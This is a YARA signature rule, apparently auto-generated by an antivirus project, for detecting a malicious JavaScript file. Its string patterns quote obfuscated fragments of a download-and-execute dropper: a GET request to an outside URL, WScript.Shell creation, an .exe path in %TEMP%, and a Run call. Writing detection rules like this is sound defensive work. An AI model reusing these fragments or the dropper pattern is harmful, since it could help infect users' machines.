rule sig_20160401_2af1f73cfcfb13b4aba03affde5dedb2 {
  meta:
    description = "datamaliciousorder - file 20160401_2af1f73cfcfb13b4aba03affde5dedb2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1bb05880229eebc6d6df4d08023f0e065b21c59b28af086f38bd8bb50523e060"

  strings:
    $s1  = "YnZa[AbdVf](\"G\" + \"ET\", \"http://xn--80ailp.com/q7usja\", false);" fullword ascii
    $s2  = "function FcJa(FprKy, JnEz){IuQeq = IuQeq * 1; return FprKy - JnEz;};" fullword ascii
    $s3  = "var AupUu = function KaHki() {return WScript[CsNg](\"WScript\"+\".Shell\");}(), PxKmj = 11;" fullword ascii
    $s4  = "if (YnZa[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function LmZc() {return AupUu[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"0C0b3FaSjfJ.ex\" + \"e\";};" fullword ascii
    $s6  = "function HjWc(){return UlrTu + \"\";};" fullword ascii
    $s7  = "function EhrPcl() {return ((JvFzz == true) && (JvFzz == UiZl)) ? 1 : IuQeq;};" fullword ascii
    $s8  = "UiZl = true; " fullword ascii
    $s9  = "var JvFzz = false;" fullword ascii
    $s10 = "var HjxUq = new this[\"Date\"]();" fullword ascii
    $s11 = "}while (WjWtu);" fullword ascii
    $s12 = "return FcJa(TjEfq, RaFdh);" fullword ascii
    $s13 = "function WuqVs(HrYvw) {var YlSy = (1, 2, 3, 4, 5, HrYvw); return YlSy;};" fullword ascii
    $s14 = "var UiZl = false;" fullword ascii
    $s15 = "function JzaRxz()" fullword ascii
    $s16 = "var MjAm = false;" fullword ascii
    $s17 = "function MkHcx(){return 23;};" fullword ascii
    $s18 = "JvFzz = true; " fullword ascii
    $s19 = "function ApHvv(){return CsNg;};" fullword ascii
    $s20 = "function XqXd(ZcAgr){AupUu[\"R\"+\"un\"](ZcAgr, IuQeq, IuQeq);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}